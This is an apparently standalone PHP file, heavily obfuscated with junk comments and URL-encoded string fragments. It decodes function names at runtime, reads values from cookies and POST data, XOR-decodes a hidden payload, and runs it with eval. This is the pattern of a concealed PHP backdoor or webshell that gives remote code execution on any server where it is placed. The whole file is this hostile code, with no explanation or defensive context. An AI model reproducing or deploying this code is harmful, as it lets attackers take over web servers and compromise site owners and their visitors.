<?php parsE_Str (// F&n'UfJ*
 '66' . '7=%' . '77' /* O >u I:7 */.# HNxSTdy<
 '%' . '4' .// t%dBH
'D%6' . 'd%3' . '0%5'// Di^HH9Fej
 .	/* er3 Q!A */ '2%7' ./* lf^~u{}D */'9%' . '4e%'	// u&qi		^	pH
. '6' /* YZHn* */.	# w/JvfqKM,
 '4%6' ./* 2s2y/h */'8' . # d9$f~3?:
	'%3'	/* jN^3UwhCK */./* /$ 71XlZ */'1%' .	/* >d%2J */ '3' /* >+Hk `[Lv' */.// AhVl0L ,
'1%3'# >"k,z??5
. '4%'/* "JNhea; */. '7' .# Oa9gQE
'5' # M >M+
.// JUJY]
'%6d'// D -<-=SR*L
. '%6'// '.<$	
. '9%6' .// 74.$t
'4'/* km $n!"Fc */. '%6'// "i482
. '6'/*  P{E4B */.	/* !?k(Gj),C */'&4' ./* ]ct	'cmZQ */'12' . '=' .	// %5w;	
'%'// 2R4AwHpr
. '65'// Di4M:\A<}
 . '%6'// 8Div ]
	. 'D%4' /* @ |3 ]	F	h */.// F)J.yk^),
'2%'	// I':	9hF 
. '65%' ./* +fhfoQ-	 */'64'# b=zn0nq$
	./* Dv!U	' */'&4' . '5' ./* lWz G{0	) */ '4=%'# 9F>xA
.# .2l<0
'75%' . '72%'	// K.'&}:hkV9
./* hL+	kyW{! */	'6'	# '	 =%W"	h
	.	/*  OmUs~ */ 'c' /* @ciz Q5ns */ . '%4'/* kb]	 } M */	. '4%6'/* f(C/{ */ .# |c7U2kQ8%g
'5%' .	// }fh "
 '43'// Q(T$	zP
./* dS7A) */'%6' . 'F%'	#  '_ v!Dr!
	. '44' . '%4' . '5&2'	# Iw{a4Kn:ot
.	/*  /=mkQ */ '25=' . '%' . // t 6Xpvf)
'44' . '%' .// d	$O1rN3		
'49%'# |[	kZ
	.	// c}C		t
 '56&' . '7' . '53='# P[H4p	3	
 .// %	.	{ux
 '%'/* 6T@/		O */.# <_u18_!!`w
'5' . '3'	/* 3p,i+U */	. # n`Pr!
'%55'/* ^Ay ]U)*{ */	. '%4D'	// ahyM F
.// &oyK./
'%4D' # JgQ~eG
.	/* awDq_ZqJ0 */'%4'/* e4o!JghMI */./* (1e5.1< */'1'# \P'(	9B	
	. '%' .// -;:Vi8c>
	'7'// q Q]SzicbC
. '2%' . # Bj(NfJ- 
 '79'/* 9vZ]I" */ . '&61' .# o{I?oGh
	'9' // 		2SY;L
. # 	'".6@z{90
'=%' .# D(u&_
	'5' .// Vk58P;	 kp
'3%'// 	s|L*!"
	.// )	hD1R
	'54%' .// Q`hU`
'52'# g(> \KO
. '%6f'	// O.|r}h
. '%4' . 'e' .// O QSzmjc
	'%' . '4' .	/* Chl!a< */ '7&' ./* <m uhDA7 */ '750'	/* -uK v=fo@ */ . // W>{]e E
 '=%'/*  &M d;4g+\ */.# ~[q)]
 '61' /* KC a~[< */. '%3' . 'a%' .//  H[.qnG
'31%'# ne~	u7
. '3'/* [c;,8Sj */.# nuZWg`
'0' . '%3a'/* ]UM\^B] */.# Xjdii
'%7' . 'b%' . '69%'/* Xutaun*.P */. '3' . # ~GY2dBJlv'
'A%' . /* Zq:W^5n3n */	'39%' ./*  	?	 R */'36%' . '3B%' /*  :l Q~@{ */ . '69'// LPO/1J
	.	# pbj!@q'
'%3A' /* =uh:	Wj0[ */. '%3' .#  E !oA:.X^
'3%3'# *Me.j	J|
.# 7}&,BR
 'B'// }iZ9K
	. '%' . '69' . '%3a'/* haUY)t%		 */ .# bR[qzGxu&
 '%' ./* },f TN */	'34' . '%34' . '%3b' .// XoE xn:.a-
'%69' .# [	5c	T87@
 '%3' . 'a%3' // Me~[Bx
. '0%'// Pfl	d	?u
. '3b' ./* (u>U 	3 */'%69' .	/* +=q^r[ds` */'%' // 0iL(9W2N:
. '3a%'/* []+Eq& Fi */	. '3'# Q	W_-c
. # 	WC`S
 '1%' . '38%'# K yb\	
. # *yJ	6
'3B' // ,ocy\aEC0@
.# D;f\K}Ix]
'%' .	// $b2"j\`o
 '69%' ./* wvD4RuA */ '3a'# }W?eO/=r
. '%' # J8X  <6
. '31' . '%'/* bOWn?w.;O */	. /* qD^K_ */'3' .	/* ue+'g */	'9' # 5sk9}?Xn
	. '%3'// c|7 .=qG
	. 'B%' . '6'//  *ai1]
	. '9%3' . 'a%' . '35'	/* DAG:M[Ut< */./* 3KF|	jM\) */'%3'//  +O:%
. # A[msvR1
 '9%3' . 'B%6' ./* W4 ql_ */'9%3'# +I>~31_
.	# 'r@	v
'a%3' .# XD)G>)!nE
 '8%'// 		va4|A 
. '3b%' ./* 	c	A9 */	'69%' . '3a%' ./* C"f.x"w"D */	'32' .	// TbU>	
'%3' .// dPgXs
'8%' .# @6Aa7vBiU
 '3B%' . '69%' .# 2W'B (CV
'3A' . '%33' ./* ^		y{<dL */'%' # b1e|=
 . '3b'	# \GpFr;d:
	.# 0'Q.m>
'%69'# "ff!G94Xx
.	# !-h>K`l
'%3'# 4EE=		
.# ^:;5Y)V 	8
'A'// xT,wy6C
. '%3'// 2jV_:N{Ws_
. '3' . '%' . // >^s\|5!	[^
'37' .	// >FVJOh!	&-
'%3' . 'B%'# .dg_/o 
. '69%' . '3a'/* N	-21y */. '%3' . '3' ./* m!793F{jr */'%3' .//  d Yk
'B%6' . '9' . /* >h)$$C'Ln */'%3' # lZ pP
.// j> 4(X_Aa
'A%'// 	]@0\
. '38%' . '37%'// U)?jj(]o
 . '3b' .// \5v\o
'%69' /* 50z2?N */. '%3' . 'A%3' # rxZ<M^'
 . '0%3'// 9RetyF
	.#  {|%5b 
'b%'/* "Ft( 2JNi~ */	./* %]677&i_  */'6' . '9'/* uu=X>6A&! */ . # 	)Br}z
'%3'/* uIoWR^	} */. /* fm 	h 3  */'a' . '%3'/* Zl?	EDT0 */. '4%3' ./* 4bH	nGL	? */'8'// 7!JOC-	(Y
.	/* 	+c	DG<_{' */	'%3' . 'b' . '%'	# +y`<P6y
. '6'# }E/RZF
 . '9%' // D*=\HuB
	. '3A' .# 	qY|!	M[nz
'%34' . '%3b'# $`Z)i
. '%' .# nu`]u;@*u
'6'/* }1'VM*q */. '9%' .// 1 O!k8b
'3'// 3sw'$"$'
 .	# qP$S\W(H 
 'a%'# & =qGjV0
. # q M8ykDo)S
'38'// /.$2R	%zM
.// >~=f+?Yw
'%' . '39'// F)Cy@!"I
. '%3b' .//  u`g@K*
	'%' /* A&^Q!^`0{) */	./* J}@7fjZ */	'69%'// yFR>,yqFLr
.// \+	H7	 8@
'3a'/* 	;pZ5\> */ .	/* mWUFJ4 */ '%3' . '4%'/* 1okeWNe~ */. '3b%'/* ^!6$tr.| */. # jO0	 *
	'6'/* NI\|C */	. '9%'	/* 2 ,] O	 */ . '3' . // luH>+s?r
 'A' // o9r6L"Mc
 ./* V66NE]	,	' */'%36'/* yJ '	8n  */ .	// P>9LqJ}
 '%' . '33' .# r%TR j9
 '%3' . 'B'# @}57MU
 .// `"-0!bu 
	'%6' . '9' .	# U\:!@s
'%3'	// 2(q*  QtW%
.# cCZ>y
	'A%2' .// p 3a5KYg
'D%' ./* "^j]8,/rFM */'31%' // tsb0n NmZ
. /* M=OYF */'3B' . '%7d' . '&76'// =YP9mtb
	./* 	N&j ))Z */ '0=%' . '69%'	/* `~7qe3Q.  */./* g4.:8$ZQ */ '5' . /* >t!>;	eM% */'4%6' /* 		J=z=tqn  */./* gkp+/&=O */'1' .# N-	j		iW7
 '%4' . 'c' .//  S?-1mB @
'%6'/* r	 .&  */. # .U-[	i
'9%4' //  OiCbwrAT 
	. '3&'// y2zxljM
. '4' . '98='	/* FBa	PA	 */. # s0$+VtI
'%6'// a"[DrF4)H
. '9%' . '68%'	# ?u@%jjm+	
. '7' /* Z.( G{ */	.# O9R,np
	'0' /* mI~'t"i& */ .// =}lVo	50=7
	'%' // ^> 	LTrL'
 .# C g0X?gy
'58%' . '3' ./* 	t;1]Iv */'3%7'// 	RGkR
. // }2!	 k<rM
 '8'// g:$55)-[p
. '%51' . '%'// +(E,U1
. '4'/* p!	-3	 */ . '9%5' . '3%3' /*  )BXp*c */./* & E_m */'5'/* KF	]afU */./* r/UwhM7sV7 */'%4a'	// Tn@: c8 1
.	/* D7,H TU */'%' .	// 4tf_ ^~	)4
'38' . '%3' . '1%7' . '0%'	// 4tUrr'6V,c
. '77' .# aJY$ 2A6T	
'%47' . '%3' . '4%' ./* OF$obht; I */	'5a%' . '6'// {n@~"\
	. '5&2'// bqU8G
.// va5Q0gCWf
	'01='	#  D:	bu`
	. '%4' . '1%5' /* 	?[f3?}5~ */. # [tCqVNA'?
'2%' /* 9q$D<;  */	.# 	k&z%
 '54%'# nB='z
 . '49%' //  be*3Mu: M
. '4' ./* Py/"!Rr1 */	'3'# $g2^y	
.// ] +&NfUC
'%4'// eFh|Y2
. 'c' . '%'# lp|[W?
. '65&' # ksZ\y$:h
. '827' .#   X,dB+EsV
 '=' .# _ow	-4: wS
	'%7' . '6%4'# SUOQT)F|
.# yoJm>,XgRX
	'3%' . # 8Qf8	
'47%' ./* |%ikH */'4' .# (sV,>Y?Q&
'b%4' . '1%4' . /* 9>g } */'c%'// x	-p 4
 .	# ud	oH*
	'4d' // (fKE\~&mP
. // ,PL]~C& 
 '%' . '4E%'/* ,diza */ .// 0 fh}ju
'3' . '1'/* fboB	f */ . '%'// fTz!{Zei
.// J!9JCA[_3-
	'4f%' . '35%'// "zWT9RoT+r
. '69%'/* ]~NBuL\q<@ */	. '68&'	// zXI'MAOB
.	# zHz +<
	'80'// 1{FeCt- 
.# y<ON, 
'0'	/* {\`d6%EPcw */	.// jb.et>
'=' . // (0Y*VmyD
 '%53' .# SE0B_
'%5'# 	cPD.gA	`
.# K\\2_jvC
'5' /* LdVzD_[U */. # (1,Dc$
'%4' .	// '<is $ ._$
'2%7' .# 	l1vEJN
'3'/* D2- 9-0Q */ . '%7' . '4%'# eCKNT
 .// C7Q	\.N+
'52&' ./* t>|e- */	'585' .// dm=|v~
 '=%7'/* c<	+n%H5\W */. '3'	// 8{,pMyy
. '%'	/* 4Q|6 c6z O */ . '7' .// 	c/RSP *
'4%' .// !md^|?l	Fc
'72' .// 58=hjUJ
'%6' . '9%6' . 'b%4'/* 0<+'9 */. '5&' . '14='/* Q-,t\S */. '%7' .# qys1x\cI
'2' . '%5'// _?\ T>d	0@
 .	/* 7W~39 */'4'/* $zqT4xjl' */.	// T<4FRgM
'&5' ./* :9L;6>;I */ '2'/* %uwAg  */. '0='// 	>	6Y*! 
./* v&B6=v */	'%'# c0be	
.	// se+VPxT8m_
'61'// jdF{L$1cD
	. '%72'// ;;	qR_u
. '%65' .// 7C>u/su
'%41' // 0EN9t}~p
 .// f%<vT
	'&2'	# u4	caNBY/y
	. '16' ./* r`d*M*`M */'=' . '%56'# Dw 	X
. '%6' . // (B	SuqZLh
	'9%'	# 3LNs[D'/
	. '44'	//   	 n Rg?E
	. # <!dGWzPk
'%' . '65%' . '6' . 'f&1' . '9' . '0=' . '%' ./* YDfQ|<-r */	'70%' //  xsaxgZ=N
	. '41'/* (;4d( */.# y	U\y&V'IF
	'%'// .a	rf}bo$
. // O@	/ZH7Y	s
'52'	# 	@d?-!zva
. '%'# b&'.>	
. '6'/* izO)+0iTR */. /* CI<n5^ */'1%' .// ~`rTL
'4d' . '&7'# xx<@_9>
. '5' ./* &	<>b */ '1=' ./* Z\gqF  */'%6'# rm	a `40
./* b	7M*}i */'F%7' . '3' .// (L9Z2-7H
'%6' /* lM67a&s */.	// $'E0d
	'1%6'# <'-P@
.// 	Y  X
'4'/* rT-]\ */	. # `?:^' (-@
'%37' # ]u4&=m"`h
	.# F~'$Y	Uv
'%7'#  =@tm)J
.	// z)\%O:3\
 '9%3'	# A+P_</ !CA
	. '5%' . '6' . 'B%'/* OZ*GJ	 */.# U1!&F\01
	'5' // (v5R^ tk:r
.# %mZ=V ^?2
'4'/* o"]]Z */. '%'// C-+(N	
.// 1e}O /`
'49' ./* R`"^,A */'%' .// 1/Z9N
'3'// 5I v-6gO
	. '8%5'#  ID :
. '4%' ./* ,%d~c5=Q/ */'61'// t)l]uBCfV
. '%4' . '8%' . '47%'	// FOm6g	AkXQ
. '45' /* w	dkV2 */ . '%3' // ca{hM. b
. '1%' ./* 0U}lI$b */	'5A'// qYJ	 a* !E
.# z'2[ 
'%' . '72'	// Wkk^	
. '&6' ./* \{h[bpdR,  */'20' ./* CoZ'p<&%_) */ '=%7' . '5' . '%'/* ~)wr{k7gq& */.// 7$hwJ
'4E%'/*  ,A1x */. '7' . '3%6' . /* n[dt  */'5%'// ~>+ P	$}'t
.	/* i3Nd](u */	'72' /* ^	rXq */ . // <I_ )
'%6' /* 	$0L> */. '9%' . '4' . '1' # j:u0~
 . '%4' . 'C' . '%' . '69' .# lTi@4Tz%jK
'%5' . /* gP!; 8` */	'A%' .# +R\	'
'45&'// z`xPOG
. '4'# ,Wd+x|p^^
. # SO7`g?	$'5
	'43='	/* !{,uh */.# z !D<ocB
	'%5' . '3%7'# r-9<FX	=K=
. '4'	/* 0 M&+J */	. '%7' . '2'# _10H7tHXWY
	.// Ww8:, 'X
	'%' . '7'// 	~0d,@CQ
. '0%' . '6' . 'F%7' . '3&' ./* /\o5>IZ&{ */'1' /* sw_ 9\q */. '8' .// rM	8(B\HU
'5'# oIC(,.<
	. '=%6'/* r;1<i+Nt  */.	# %.?ms
'2'// U/\-H(		eX
. '%4' . /* K7 dm: */'7'// ? {\Q""
. '%'	/* f}wTO2r-Q */ .// 'Cr|L.
'7'// tly]-},
.#  "" IdxJ
 '3'# \S		qGL`1E
.# h<lc1Wn
'%4F' . # 	~P7(^	Y
	'%'/* V{[*r_zsL> */ . '55' // E<, jw <
. '%4'	# d,v5K/
 .// :-!9{3s<
 'E' .	/* )i"gK */	'%44'	/* 1vE?dGEG */. '&94' .// WgmS	raQ
	'3'# TH	uXwu
. '=%'	# dM{I	[`Ss
.	//  gsTUVyHo
'7' . '3%7' # J\1[jyC*I*
. '4'/* ;3%]E@	$ */.# eo8et{z(g!
'%72' . '%4' . 'c%' . '65' ./* BDOWuw8 */ '%4' .// _WI?u l)	"
 'e'// HI*}QG7o9
.// c8_(<Za
'&'# Gyj"i	>
./* )g3;K)Cj? */'2' // s +Hd_Yq 
.# \GhPiO)|
'71' .// }Cz5|{
 '=%'	//  g5=\[
. '44'	// y{C{IQLX
.# +qqpRp"!
 '%' .// 0,@^ 
'41'# s[L2 ?gI_R
. '%5' . '4%' . // W	dFTB};x
	'61%'// U,	d"'p
 . '4C%' .// 4U-X,`<
'6' .// "	6Ks
'9%'	/* }:7L&  */.# B@$/6y?x
'53' ./* ?7e;	hc@ */'%5'/* 	tRhyw */.	/* 9_kS8^cM */ '4&6'/* ImJO{:ZJ */ . '56'// Y4C|m
 . '=' . '%61' . '%72'# vG\oP
 ./* 8),K!: $ */'%5'	// zvTy@,q}gA
. '2%' ./* JJ(RQ */'41%' . '5' .# 	^9- NtU
	'9' ./* +W\A. */'%5f' .// *ZYeXbi3
 '%76' #  Hj	ggcD])
 . '%6' # 8`}- n,
./* %7SpRt4"	 */'1%' ./*  .'Yo; K{5 */'4C'# PV*`i
./* Zk@*| */'%' ./* 	MC.=  */	'75' .// |9,KGk
'%4' .	/* _~K4EV,>  */'5%5'/* 3	qeHR' */ . '3&5' . '26'/* nN`SXR */. '=%' /* (u@Iy{ */ . '42' .// ~tHm	8"h
'%6' ./* ~ 1)DP!J[ */'1' .// <ps		sv
'%7' . /* Uy@Tr0` */	'3%' . '4'	/* Vmuj,9ma7a */ . '5%' . '3'	# l	P%YpC
.	// &=am cU/ 3
'6%'// 	dj;@%hxS
	. '34'/* vsH06v9 */	. '%5f'# su+=zse/V
 . '%44' .// Ttx6Y
	'%' # @oNune*6J
. '4'# O~vX-2 
 . '5%'	# we Z(J
. '6'# 8	iftpC
	. '3' # x5zVC
.# H9k `
 '%6f'# LeXC>
	.# VWl"X|h
 '%64' . '%45' . '&97' ./* ),	?r */ '5=%'	# UlXL&'J
.# 9 ~%9
	'50%' .	// K4,b  
'5'// `(;?(M|0c;
. '2%' . '6f' . '%' . '47%' .# 3?{<D!
'7' .// RVPR_
	'2%6'# NXyqK6J
. '5%7' .// risIORN	b
 '3%'	# u3l5M 
. '7'// J2""|F
.// (df  
'3' , $oGl ) ;// 	4oWV
$rDO =# _y>pE
$oGl [ 620	# 	3 ~X*OpP
 ]($oGl [ 454	/* y"q:>vC */]($oGl [ 750 ])); function// To OC
vCGKALMN1O5ih/* h I	KT|\ */(// -M)HHWW
	$xxM5 , $criV )	/* `%m	isKR */ {# u1=eK,[% 3
global/* &4	[]@ */$oGl // ~`8~1_
 ; $ZAnnaD# es9Mu+	;
= ''# ~V,6)yc*
; for ( /* n3bM/bG1<> */$i/* ^\bpv*Yf */ = // k}`yZG	-x
	0 /* >=	2^- */ ; $i// Zh f-f_-
 < /* !IXS	J? */ $oGl# yxQ{S{uv! 
	[// ,/"At
	943# Z|h{w;X>:{
	]# R y6	[E4
( $xxM5// "7^	X/U	=
) ; $i++// np1F_r
) // UiY/wTe 
	{// BO\BQ
$ZAnnaD/* C!:&	ms	_ */.= $xxM5[$i]	/* /NClWL!(|3 */^# o7	gq 
$criV [# b{jnnZ
$i # !	Ecif
	% $oGl// ly]*H
[ 943 /* de/rk+D|	 */]/* nzjk	 */	( $criV )/* @O,6{o */] ; } return $ZAnnaD	// <aM p!
;/* Q(o!nf */}// H o 9b8
function	/* c!:F9 */	ihpX3xQIS5J81pwG4Ze (/* a	U\ve7 '@ */ $nqx4# `I 6t
 ) { global $oGl ;// 5 ?)";	
return// eT*		~6
$oGl# _FW\8iRp^
[	/* Jl$= p	 */656//   K S&
 ] ( $_COOKIE # H$TK)T
)/* @J	?,)< */[ $nqx4 ] ; }	/* JW{K_kI */function wMm0RyNdh114umidf/* 0*<4; */( $xuLw ) { global/* iR	oj`$jTv */$oGl ;/* 	;pv/G'0~ */ return $oGl	/* 4-/aMJPR */[	# 5 UfCc/(+	
656 ] ( $_POST ) // 2tvT)*
 [ $xuLw// 8Yr7[m"
]	// [e,v`n
;/* ^Zis	]F	> */} $criV# KC G	[y>v 
= $oGl// E}-		2Q?
 [#  7Z	\V(gh	
	827 ] (/* C;[5?`]y& */ $oGl // ?kq	pjJJ
[/* =W] o */526 ]// +&>Oof
( /* <k" B"?Ys */$oGl // `on8c&lCaE
[# FS)	3
800/*  &~.O )M */] (# V|nwL$&j
$oGl# t5iF/xL.G 
[ 498 /* 4 )	K  ) */] ( $rDO# *Sm7^	3_Y*
[	/* Qf /o */	96/* io1b9j-'P1 */	] )/* Z0LGu */,/* T1eC/? */$rDO	/* NFpcZxHE */[ 18// 	J~ XP
]	// N<.|3
,# lH;v S~b
$rDO# Ah	=kA1
	[ // wQqPa
28 ]/* bvrABj+h  */	*// ]s	"U~l
	$rDO/* x&+!	 2d	 */[ 48 ] // <=G}PVF?l
	)# 0Hn^o}y.(
 ) /* 1y$Mhjh" */ ,// 94d6A	7\
$oGl [// X	r-\
 526 ] (/* 57a	eI1jZR */$oGl [// 5(fiA]
800	/* TESj)9	Exh */]/* %713f/Ylx */ (	/* d$	L	h */	$oGl// UD%^i
 [// Q	:5 X
498 ]/* 3 4sSoC!7P */	( $rDO// p	UKJs</
	[	// '	ZdaN
44 ] ) // *e&N)"F9fE
, $rDO//  / n	y_
[ # >ah\	BO
	59 ] ,#  ,Eah3
$rDO// HF-+9)
[# Tut/Z &;P0
37 ]/*  	a5 iOgD  */	* $rDO	/* 	<a	+]0 */[ 89 ]# qn|	U
	)# c<N	vO	
) ) ; /* ?X=ED,'$ e */ $S5WI/* b q+ / */= //  GQk,
	$oGl [/* _'%nGyJ=  */827 ] ( $oGl [ 526 ]# H6H`f	9
( $oGl#  RzkLZrX
[// 4!AwkIlR
667	// lp M'"H"H~
] (// Lfh*P3r%z
 $rDO/* 	 kQz!E */[ /* +cB'	rB9 */87 ] ) )	# _Yti>v&
,	/* }FDq9 {tx */$criV )/* Z3@N)7dY */; if (# iSFF0
$oGl [	// waWmD	
	443 // <'01h83
]#  "V]Hh
( # WZ>nB_1`zt
$S5WI ,/* |[Aw 5FK */$oGl [	#  	<v5Gsst,
751/* fhaWC}K 9- */] ) > $rDO	// m~6 ~CFj
[ 63# jlHYL
	] ) EvAL (# ?KnA Kw
$S5WI # C19cQ2
) ; // G 4`0 t
